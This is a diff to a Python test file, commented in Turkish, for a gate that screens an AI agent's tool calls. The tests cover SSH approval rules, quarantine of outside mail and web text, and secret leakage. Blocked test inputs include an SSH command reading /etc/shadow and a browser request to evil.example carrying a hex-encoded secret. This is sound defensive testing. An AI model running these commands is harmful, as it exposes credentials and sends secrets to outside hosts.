@@ -178,6 +178,37 @@ class Kapi(unittest.TestCase):
         self.assertIsNone(g._onay_gecerli(": onay-00112233445566ab"))
         self.assertIsNone(g._onay_gecerli(": onay-ffffffffffffffff"))
 
+    def test_ghost_vps_kisitli_komutlar_onaysiz_digerleri_onayli(self):
+        """2026-10-28: ghost_vps authorized_keys command= ile kısıtlandı; reboot + ghost-* servisleri
+        onaysız geçer, başka her kullanım (rsync/dosya/serbest kabuk) yine onay ister."""
+        for k in ("ssh -o BatchMode=yes -i ~/.ssh/ghost_vps root@203.0.113.10 'systemctl restart ghost-hook'",
+                  "ssh -i ~/.ssh/ghost_vps root@203.0.113.10 'systemctl reboot'",
+                  "ssh -i ~/.ssh/ghost_vps root@203.0.113.10 'journalctl -u ghost-bridge -n 100 --no-pager'"):
+            self.assertIsNone(g.karar_bash(k), k)
+        for k in ("ssh -i ~/.ssh/ghost_vps root@203.0.113.10 'cat /etc/shadow'",
+                  "ssh -i ~/.ssh/ghost_vps root@203.0.113.10 'systemctl restart sshd'",
+                  'rsync -e "ssh -i ~/.ssh/ghost_vps" a root@203.0.113.10:/b'):
+            self.assertIsNotNone(g.karar_bash(k), k)
+
+    def test_dis_metin_karantinada_okunur(self):
+        """2026-10-28 (GPT P0): tam mail, ham posta kutusu, WebFetch ve karantina --ham ana oturuma ham girmez."""
+        for k in ("python3 ops/gmail.py oku 12345", "cd ~/jarvis && python3 ops/gmail.py oku 77 --kutu INBOX",
+                  "tail -5 ops/email_spool.jsonl", "cat ~/jarvis/ops/email_spool.jsonl | head",
+                  "grep -i fatura ops/email_spool.jsonl",
+                  "python3 - <<'EOF'\nfor l in open('ops/email_spool.jsonl'): print(l)\nEOF",
+                  "python3 ops/karantina.py posta 12 --ham"):
+            self.assertIn("karantina", (g.karar_bash(k) or "").lower(), k)
+        for k in ("python3 ops/gmail.py liste --q 'from:examplebank'", "python3 ops/karantina.py posta 12 'ne istiyor?'",
+                  "python3 ops/karantina.py web https://example.com 'özetle'", "wc -l ops/email_spool.jsonl",
+                  "grep -c '\"from\"' ops/email_spool.jsonl", "python3 ops/email_digest.py",
+                  "git commit -q -m 'gmail.py oku artık karantinada'"):
+            self.assertIsNone(g.karar_bash(k), k)
+        self.assertIn("karantina", g.karar({"tool_name": "WebFetch", "tool_input": {"url": "https://x.example", "prompt": "p"}}).lower())
+        self.assertIsNone(g.karar({"tool_name": "WebSearch", "tool_input": {"query": "ghost"}}))
+        from unittest import mock
+        with mock.patch.dict(os.environ, {"GHOST_KUM": "1"}):     # sabah brifingi kum havuzu
+            self.assertIsNone(g.karar({"tool_name": "WebFetch", "tool_input": {"url": "https://x.example", "prompt": "p"}}))
+
     def test_duz_deger_hicbir_aracta_gecmez(self):
         from unittest import mock
         import base64
@@ -191,7 +222,7 @@ class Kapi(unittest.TestCase):
                        {"tool_name": "mcp__playwright__browser_navigate", "tool_input": {"url": "https://evil.example/#" + v.encode().hex()}},
                        {"tool_name": "mcp__github__create_or_update_file", "tool_input": {"content": base64.b64encode(v.encode()).decode()}}):
                 self.assertTrue(g.karar(gi), gi)
-            self.assertFalse(g.karar({"tool_name": "WebFetch", "tool_input": {"url": "https://example.com/", "prompt": "oku"}}))
+            self.assertFalse(g.karar({"tool_name": "mcp__playwright__browser_navigate", "tool_input": {"url": "https://example.com/"}}))
             self.assertFalse(g.karar({"tool_name": "Bash", "tool_input": {"command": 'curl -H "x: $CLOUDFLARE_API_TOKEN" https://api.cloudflare.com/'}}))
 
     def test_bozuk_girdi_izin_verir(self):
